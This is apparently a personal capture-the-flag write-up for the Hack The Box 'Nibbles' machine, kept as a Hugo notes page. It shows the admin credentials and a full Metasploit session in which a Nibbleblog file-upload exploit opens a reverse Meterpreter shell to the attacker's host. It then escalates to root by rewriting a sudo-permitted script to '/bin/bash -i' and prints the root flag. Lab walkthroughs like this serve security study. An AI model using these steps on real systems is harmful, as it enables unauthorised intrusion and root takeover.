---
### The title for the content.
title: "Nibbles"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "nibbles"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description: "Notes from the Nibbles machine on HTB."
### The datetime assigned to this page.
date : 2020-03-10T16:43:47+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "nibbles"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## Nibbles

### where you at

10.10.10.75

### what you got

{{%attachments title="Related files" style="grey" pattern=".*(nmap)" /%}}

{{%attachments title="Related files" style="grey" pattern=".*(gobuster)" /%}}

{{%attachments title="Related files" style="grey" pattern=".*(nikto)" /%}}

`http://10.10.10.75/nibbleblog/admin`

`admin:nibbels`

`https://www.exploit-db.com/exploits/38489`

```bash
msf5 > search nibble

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability


msf5 > use 0
msf5 exploit(multi/http/nibbleblog_file_upload) > set LHOST tun0
LHOST => tun0
msf5 exploit(multi/http/nibbleblog_file_upload) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf5 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf5 exploit(multi/http/nibbleblog_file_upload) > show options

Module options (exploit/multi/http/nibbleblog_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   nibbles          yes       The password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the web application
   USERNAME   admin            yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Nibbleblog 4.0.3


msf5 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog
TARGETURI => /nibbleblog
msf5 exploit(multi/http/nibbleblog_file_upload) > run

[-] Exploit failed: The following options failed to validate: RHOSTS.
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/nibbleblog_file_upload) > set RHOST 10.10.10.75
RHOST => 10.10.10.75
msf5 exploit(multi/http/nibbleblog_file_upload) > run

[*] Started reverse TCP handler on 10.10.14.23:4444
[*] Sending stage (38288 bytes) to 10.10.10.75
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.75:57370) at 2020-01-24 00:58:54 +0100
[+] Deleted image.php

meterpreter >
meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: nibbler (1001)
meterpreter >

msf5 exploit(multi/http/nibbleblog_file_upload) > search suggest

Matching Modules
================

   #  Name                                             Disclosure Date  Rank    Check  Description
   -  ----                                             ---------------  ----    -----  -----------
   0  auxiliary/server/icmp_exfil                                       normal  No     ICMP Exfiltration Service
   1  exploit/windows/browser/ms10_018_ie_behaviors    2010-03-09       good    No     MS10-018 Microsoft Internet Explorer DHTML Behaviors Use After Free
   2  exploit/windows/smb/timbuktu_plughntcommand_bof  2009-06-25       great   No     Timbuktu PlughNTCommand Named Pipe Buffer Overflow
   3  post/multi/recon/local_exploit_suggester                          normal  No     Multi Recon Local Exploit Suggester
   4  post/osx/gather/enum_colloquy                                     normal  No     OS X Gather Colloquy Enumeration
   5  post/osx/manage/sonic_pi                                          normal  No     OS X Manage Sonic Pi


msf5 exploit(multi/http/nibbleblog_file_upload) > use 3
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.75 - Collecting local exploits for php/linux...
[-] 10.10.10.75 - No suggestions available.
[*] Post module execution completed
msf5 post(multi/recon/local_exploit_suggester) >


```

home has personal.zip, has monitor script in it. user can run it as root.

```bash
 Testing 'sudo -l' without password & /etc/sudoers
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh

```

create file /home/nibbler/personal/stuff/monitor.sh

```bash
/bin/bash -i
```

```bash
cd /home/nibbler/personal/stuff/
sudo ./monitor.sh
sudo ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
bash: cannot set terminal process group (1309): Inappropriate ioctl for device
bash: no job control in this shell
root@Nibbles:/home/nibbler/personal/stuff# cd /root
cd /root
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
cat root.txt
b6d745c0dfb6457c55591efc898ef88c
```
